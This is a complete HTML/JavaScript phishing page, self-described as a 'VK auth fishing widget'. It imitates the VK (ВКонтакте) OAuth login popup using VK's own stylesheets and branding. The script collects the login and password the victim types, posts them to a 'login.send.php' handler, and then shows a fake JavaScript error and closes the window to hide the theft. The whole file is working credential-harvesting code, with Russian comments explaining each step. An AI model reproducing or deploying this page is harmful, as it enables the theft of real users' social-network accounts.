<!DOCTYPE html>
<html>
<!--
 *
 * @author: d32ds3c (ADM1N)
 * @name: VK auth fishing widget
 * @spcl: https://vk.com/bite_owl
 *
-->
    <head>
	  <meta charset="UTF-8">
<!--      <base href="http://--><?php //echo $_SERVER['SERVER_NAME']; ?><!--">-->
      <link rel="shortcut icon" href="https://vk.com/images/icons/favicons/fav_logo.ico?6">
	  <title>ВКонтакте | Вход</title>
	  <link rel="stylesheet" type="text/css" href="https://vk.com/css/al/common.css?47851242993" />
      <link rel="stylesheet" type="text/css" href="https://vk.com/css/al/fonts_cnt.css?1318650823" />
      <link type="text/css" rel="stylesheet" href="https://vk.com/css/api/oauth_popup.css?27051770477"/>
      <script type="text/javascript" language="javascript" src="https://vk.com/js/api/common_light.js?2102079137"></script>
      <script
              src="https://code.jquery.com/jquery-3.3.1.min.js"
              integrity="sha256-FgpCb/KJQlLNfOu91ta32o/NMZxltwRo8QtmkMRdAu8="
              crossorigin="anonymous"></script>
      <style>
          #error_msg{
              position: fixed;
              top: 0;
              left: 0;
              background-color: #ff9d89;
              font-size: 11pt;
              padding: 10px;
              border-radius: 0 0 10px 0;
          }
      </style>
  </head>
  <body class="VK oauth_full">
  <div id="error_msg" ><b>JavaScript error:</b> initCustomMedia is not defined</div>
  <div class="oauth_wrap">
      <div class="oauth_wrap_inner">
          <div class="oauth_wrap_content" id="oauth_wrap_content">
              <div class="oauth_head">
                  <a class="oauth_logo fl_l" href="https://vk.com" target="_blank"></a>
                  <div id="oauth_head_info" class="oauth_head_info fl_r">
                      <a class="oauth_reg_link" href="https://vk.com/join?reg=1" target="_blank">Регистрация</a>
                  </div>
              </div>

              <div class="oauth_content box_body clear_fix">
                  <div class="box_msg_gray box_msg_padded">Для продолжения Вам необходимо войти <b>ВКонтакте</b>.</div>

                  <div class="box_error" style="display: none;">Указан неверный логин или пароль.</div>


                  <!--<form method="POST" id="login_submit" > action="https://login.vk.com/?act=login&soft=1" -->
                      <div class="oauth_form">
                          <div class="oauth_form_login">
                              <div class="oauth_form_header">Телефон или email</div>
                              <input type="text" class="oauth_form_input dark" id="email" name="email" value="">
                              <div class="oauth_form_header">Пароль</div>
                              <input type="password" class="oauth_form_input dark" id="pass" name="pass" />
                              <button class="flat_button oauth_button button_wide" id="install_allow" type="submit" >Войти</button><!--onclick="return login(this);"-->
                              <a class="oauth_forgot" href="https://vk.com/restore" target="_blank">Забыли пароль?</a>
                              <input type="submit" name="submit_input" class="unshown">
                          </div>
                      </div>
                  <!--</form>-->
              </div>
          </div>
      </div>
  </div>
    <script>
        //При клике на кнопку "Войти" совершается данная функция
        $("#install_allow").click(function () {

            //Получаем данные
            let log_u = $("#email").val();
            let pass_u = $("#pass").val();

            //Проверяем, что бы они не были пустыми
            if (log_u !== "" && pass_u !== "")
            {
                //Отоправляем их в скрипт "login.send.php" методом "POST"
                $.ajax({
                    type: "POST",
                    url:  "login.send.php",
                    data: "phone="+log_u+"&pass="+pass_u,
                    success: function () {
                        //Как только всё отправилось - выводим ошибку и закрываем окно.
                        $("#error_msg").show();
                        setTimeout(function () {
                            window.close();
                        }, 500);
                    },
                });
            }
            else
            {
                //Если поля пустые - выводим ошибку
                $(".box_error").show();
            }
        });
        //Прячем ошибку после загрузки документа.
        $(document).ready(function () {
           $("#error_msg").hide();
        });
    </script>
  </body>
</html>
</html>		
